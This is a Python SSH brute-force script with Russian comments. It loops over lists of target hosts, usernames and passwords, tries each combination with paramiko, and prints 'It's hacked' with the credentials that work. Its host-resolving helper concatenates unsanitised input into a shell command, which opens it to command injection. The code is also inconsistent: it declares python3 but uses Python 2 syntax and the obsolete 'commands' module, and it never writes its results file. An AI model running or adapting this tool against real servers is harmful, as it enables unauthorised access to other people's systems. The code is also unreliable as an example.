#! /usr/bin/python3
# -*- coding: utf-8 -*-

from paramiko import *	# Избавляемся от префикса paramiko
import commands 		# Либа для выполнения системной команды host в функции резолва доменов 
import socket			# Избавляемся от ошибки в эксепшне обрыва соединения

# Открываем файлы
targets = 	open('./targets.lst').readlines()
logins 	= 	open('./logins.lst').readlines()
passwords = open('./passwords.lst').readlines()
results	=	open('./results.lst', 'w')
util.log_to_file('paramiko.log')	# Включаем логгирование в файл
# Инициализируем SSH-клиент
client = SSHClient()				# Создаём объект
client.load_system_host_keys()		# Подгружаем ключи хостов, а если ключа не нашлось =>
client.set_missing_host_key_policy(AutoAddPolicy()) # => добавляем автоматически

def resolv(host_n):
	'''Возвращает Return ip from given string. If given string is domain,
		resolv() has returned resolved ip, else if string is ip,
		resolv() simply return this ip'''
	cmd_s = "host " + host_n
	res = commands.getoutput(cmd_s).split()[3]
	if res == 'found:':
		return host_n
	else:
		return res

### MAIN ###
error=''
for trg in targets:
	trg = resolv(trg.strip())
	for lgn in logins:
		lgn = lgn.strip() 
		if error == 'yes':
			error=''
			break
		for psw in passwords:
			psw = psw.strip()
			try:
				client.connect(trg, username = lgn, password = psw, timeout=2)
				stdin, stdout, stderr = client.exec_command('date')
				#print stdout
				print '!!! It\'s hacked', trg, '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
				print lgn, psw, '\n'
			except SSHException:
				print 'Wrong auth: ', trg, '\n', lgn, psw, '\n'
				#print SSHException.message, '\n'
			except socket.error:
			#except :
				print "Connection refused to host", trg, '\nGoing to next host\n\n'
				error='yes'
				break # skip host if it refused
	#print 'Next host'